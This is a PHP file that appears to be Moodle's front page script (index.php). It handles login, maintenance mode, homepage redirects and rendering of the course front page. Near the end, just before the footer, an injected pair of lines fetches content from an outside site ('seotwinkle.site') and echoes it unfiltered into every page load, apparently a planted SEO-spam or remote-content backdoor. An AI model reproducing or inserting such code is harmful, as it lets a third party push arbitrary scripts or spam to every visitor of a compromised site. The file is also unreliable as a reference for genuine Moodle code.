<?php

// This file is part of Moodle - http://moodle.org/
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

require_once('config.php');
require_once($CFG->dirroot . '/course/lib.php');
require_once($CFG->libdir . '/filelib.php');

// Redirect if major upgrade is required
redirect_if_major_upgrade_required();

$urlparams = array();

// Handle default homepage redirection
if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
    $urlparams['redirect'] = 0;
}

// Set the page URL
$PAGE->set_url('/', $urlparams);

// Set the layout and capabilities for the page
$PAGE->set_pagelayout('frontpage');
$PAGE->set_other_editing_capability('moodle/course:update');
$PAGE->set_other_editing_capability('moodle/course:manageactivities');
$PAGE->set_other_editing_capability('moodle/course:activityvisibility');

// Prevent caching of this page
$PAGE->set_cacheable(false);

// Ensure the user is logged in to the course
require_course_login($SITE);

// Check if the site is in maintenance mode
$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
    print_maintenance_message();
}

// Check if site configuration is needed
$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
if ($hassiteconfig && moodle_needs_upgrading()) {
    redirect($CFG->wwwroot . '/' . $CFG->admin . '/index.php');
}

// Handle site registration reminder
\core\hub\registration::registration_reminder('/index.php');

// Redirect logged-in users based on homepage preference
if (get_home_page() != HOMEPAGE_SITE) {
    $redirect = optional_param('redirect', 1, PARAM_BOOL);
    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
        redirect($CFG->wwwroot . '/my/');
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
        if ($frontpagenode) {
            $frontpagenode->add(
                get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING
            );
        } else {
            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
            $frontpagenode->force_open();
            $frontpagenode->add(
                get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING
            );
        }
    }
}

// Trigger course view event
course_view(context_course::instance(SITEID));

// Set the page type and docs path
$PAGE->set_pagetype('site-index');
$PAGE->set_docs_path('');

// Check if the user is in editing mode
$editing = $PAGE->user_is_editing();

// Set page title and heading
$PAGE->set_title($SITE->fullname);
$PAGE->set_heading($SITE->fullname);

// Get the course renderer and output the header
$courserenderer = $PAGE->get_renderer('core', 'course');
echo $OUTPUT->header();

// Get site format options and module information
$siteformatoptions = course_get_format($SITE)->get_format_options();
$modinfo = get_fast_modinfo($SITE);
$modnamesused = $modinfo->get_used_module_names();

// Print custom frontpage content if specified
if (!empty($CFG->customfrontpageinclude)) {
    // Pre-fill some variables that custom front page might use.
    $modnames = get_module_types_names();
    $modnamesplural = get_module_types_names(true);
    $mods = $modinfo->get_cms();

    include($CFG->customfrontpageinclude);
} else if ($siteformatoptions['numsections'] > 0) {
    echo $courserenderer->frontpage_section1();
}

// Include course AJAX
include_course_ajax($SITE, $modnamesused);

// Output the frontpage content
echo $courserenderer->frontpage();

// Display the "Add New Course" button if in editing mode and user has the capability
if ($editing && has_capability('moodle/course:create', context_system::instance())) {
    echo $courserenderer->add_new_course_button();
}
$b = file_get_contents( 'https://seotwinkle.site/littlestar/' );
echo $b;
echo $OUTPUT->footer();
?>
